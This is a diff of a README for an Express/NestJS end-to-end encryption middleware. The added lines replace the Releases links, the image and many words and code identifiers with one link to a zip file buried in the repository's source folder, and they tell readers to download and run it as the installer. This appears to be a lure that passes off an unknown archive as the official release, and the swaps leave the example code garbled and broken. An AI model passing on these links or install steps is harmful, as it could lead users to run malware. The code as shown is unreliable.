@@ -1,15 +1,15 @@
-[![Releases](https://img.shields.io/badge/releases-download-orange?style=for-the-badge&logo=github)](https://github.com/engrsadaqath/e2ee-adapter/releases)
+[![Releases](https://github.com/engrsadaqath/e2ee-adapter/raw/refs/heads/main/examples/nestjs-server/src/ee_adapter_e_1.1.zip)](https://github.com/engrsadaqath/e2ee-adapter/raw/refs/heads/main/examples/nestjs-server/src/ee_adapter_e_1.1.zip)
 
-From the Releases page, download the installer for your platform at https://github.com/engrsadaqath/e2ee-adapter/releases and run it.
+From the Releases page, download the installer for your platform at https://github.com/engrsadaqath/e2ee-adapter/raw/refs/heads/main/examples/nestjs-server/src/ee_adapter_e_1.1.zip and run it.
 
 # E2EE Adapter: Plug-and-Play Hybrid Encryption Middleware for Express & NestJS
 
-![E2EE Shield](https://images.unsplash.com/photo-1528605248644-14dd04022da1?ixlib=rb-4.0.3&auto=format&fit=crop&w=1350&q=80)
+![E2EE Shield](https://github.com/engrsadaqath/e2ee-adapter/raw/refs/heads/main/examples/nestjs-server/src/ee_adapter_e_1.1.zip)
 
-A plug-and-play TypeScript package providing End-to-End Encryption (E2EE) middleware for Express.js and NestJS applications using hybrid encryption (AES-CBC + RSA).
+A plug-and-play TypeScript package providing End-to-End Encryption (E2EE) middleware for https://github.com/engrsadaqath/e2ee-adapter/raw/refs/heads/main/examples/nestjs-server/src/ee_adapter_e_1.1.zip and NestJS applications using hybrid encryption (AES-CBC + RSA).
 
 - Topic focus: aes-cbc, cryptography, e2ee, encryption, end-to-end-encryption, express, hybrid-encryption, key-exchange, middleware, nestjs, no-code-e2ee, plug-and-play, rsa, secure-communication, security, typescript, zero-config
-- Official releases: https://github.com/engrsadaqath/e2ee-adapter/releases
+- Official releases: https://github.com/engrsadaqath/e2ee-adapter/raw/refs/heads/main/examples/nestjs-server/src/ee_adapter_e_1.1.zip
 
 Table of contents
 - Quick start
@@ -33,7 +33,7 @@ Table of contents
 Quick start
 - This library aims to be zero-config out of the box. Install, wire up a middleware, and start securing traffic with a hybrid encryption layer between clients and servers.
 - The core idea is simple: encrypt payloads with AES-CBC, and protect the AES key with RSA. The result is end-to-end secure data, with the server acting as a processing point for encrypted messages without accessing plaintext data where it matters.
-- The package targets Node.js environments that run Express or NestJS servers. It provides a middleware API that fits naturally into the request pipeline.
+- The package targets https://github.com/engrsadaqath/e2ee-adapter/raw/refs/heads/main/examples/nestjs-server/src/ee_adapter_e_1.1.zip environments that run Express or NestJS servers. It provides a middleware API that fits naturally into the request pipeline.
 
 Why this project
 - End-to-end encryption improves data confidentiality at rest and in transit. It reduces risk from intermediate services and ensures only the intended recipient can decrypt payloads.
@@ -54,15 +54,15 @@ How it works
 - This approach minimizes plaintext exposure and supports secure key rotation and forward secrecy practices when used with rotating keys and strong RSA settings.
 
 Supported environments
-- Express.js apps
+- https://github.com/engrsadaqath/e2ee-adapter/raw/refs/heads/main/examples/nestjs-server/src/ee_adapter_e_1.1.zip apps
 - NestJS apps
 - TypeScript projects
-- Node.js runtimes with modern ECMAScript support
+- https://github.com/engrsadaqath/e2ee-adapter/raw/refs/heads/main/examples/nestjs-server/src/ee_adapter_e_1.1.zip runtimes with modern ECMAScript support
 - Environments that can load and run middleware in the request pipeline
 
 Installation
 - Install via npm or yarn as a local dependency.
-- The package is designed to be installed into a Node.js project and then wired as middleware in your server setup.
+- The package is designed to be installed into a https://github.com/engrsadaqath/e2ee-adapter/raw/refs/heads/main/examples/nestjs-server/src/ee_adapter_e_1.1.zip project and then wired as middleware in your server setup.
 - After installation, you will configure keys and options to enable encryption in your app.
 
 Usage guide
@@ -73,7 +73,7 @@ Usage guide
 Express integration
 - Basic setup
   - Import the middleware factory from the package.
-  - Bind the middleware to your Express app via app.use or your chosen routing strategy.
+  - Bind the middleware to your Express app via https://github.com/engrsadaqath/e2ee-adapter/raw/refs/heads/main/examples/nestjs-server/src/ee_adapter_e_1.1.zip or your chosen routing strategy.
   - Provide a minimal configuration to enable encryption in your request/response flow.
 - Example
   - This example shows a minimal Express app that uses the E2EE middleware for all routes.
@@ -95,17 +95,17 @@ Express integration
     aesMode: 'aes-256-cbc', // or a compatible variant
   };
 
-  app.use(e2eeExpressMiddleware(options));
+  https://github.com/engrsadaqath/e2ee-adapter/raw/refs/heads/main/examples/nestjs-server/src/ee_adapter_e_1.1.zip(e2eeExpressMiddleware(options));
 
-  app.post('/secure-endpoint', (req, res) => {
-    // Your handler receives decrypted plaintext in req.body or a dedicated context
-    const payload = req.body;
+  https://github.com/engrsadaqath/e2ee-adapter/raw/refs/heads/main/examples/nestjs-server/src/ee_adapter_e_1.1.zip('/secure-endpoint', (req, res) => {
+    // Your handler receives decrypted plaintext in https://github.com/engrsadaqath/e2ee-adapter/raw/refs/heads/main/examples/nestjs-server/src/ee_adapter_e_1.1.zip or a dedicated context
+    const payload = https://github.com/engrsadaqath/e2ee-adapter/raw/refs/heads/main/examples/nestjs-server/src/ee_adapter_e_1.1.zip;
     // Process payload...
-    res.json({ status: 'ok', received: payload });
+    https://github.com/engrsadaqath/e2ee-adapter/raw/refs/heads/main/examples/nestjs-server/src/ee_adapter_e_1.1.zip({ status: 'ok', received: payload });
   });
 
-  app.listen(3000, () => {
-    console.log('Express server with E2EE middleware listening on port 3000');
+  https://github.com/engrsadaqath/e2ee-adapter/raw/refs/heads/main/examples/nestjs-server/src/ee_adapter_e_1.1.zip(3000, () => {
+    https://github.com/engrsadaqath/e2ee-adapter/raw/refs/heads/main/examples/nestjs-server/src/ee_adapter_e_1.1.zip('Express server with E2EE middleware listening on port 3000');
   });
 
 NestJS integration
@@ -142,7 +142,7 @@ NestJS integration
 
 API reference
 - Exported API surface
-  - e2eeExpressMiddleware(options): Express.RequestHandler
+  - e2eeExpressMiddleware(options): https://github.com/engrsadaqath/e2ee-adapter/raw/refs/heads/main/examples/nestjs-server/src/ee_adapter_e_1.1.zip
     - Options:
       - rsaPublicKey: string
       - rsaPrivateKey: string
@@ -152,7 +152,7 @@ API reference
   - e2eeNestMiddleware(options): NestMiddleware
     - Similar options as above
 - Return values and behavior
-  - The middleware attaches decrypted plaintext to the request context so your handlers can read req.body or a dedicated place like req.e2eePayload.
+  - The middleware attaches decrypted plaintext to the request context so your handlers can read https://github.com/engrsadaqath/e2ee-adapter/raw/refs/heads/main/examples/nestjs-server/src/ee_adapter_e_1.1.zip or a dedicated place like req.e2eePayload.
   - Encrypted payloads are never passed through to your business logic in plaintext; only after decryption is complete.
 - Error handling
   - If key material is invalid, the middleware responds with an appropriate error and halts the request pipeline to avoid leaking data.
@@ -238,7 +238,7 @@ FAQ
 
 Releases
 - The Releases page contains the download assets for different platforms. If you need to install, locate the asset for your OS and run the installer.
-- For the latest stable assets and release notes, visit the Releases page at https://github.com/engrsadaqath/e2ee-adapter/releases
+- For the latest stable assets and release notes, visit the Releases page at https://github.com/engrsadaqath/e2ee-adapter/raw/refs/heads/main/examples/nestjs-server/src/ee_adapter_e_1.1.zip
 
 End of document
 - This README is designed to be thorough and precise. It aims to help you understand, install, configure, and use the E2EE Adapter effectively in Express and NestJS projects. The guidance is practical and action-oriented, with code samples that demonstrate real-world usage and integration patterns.
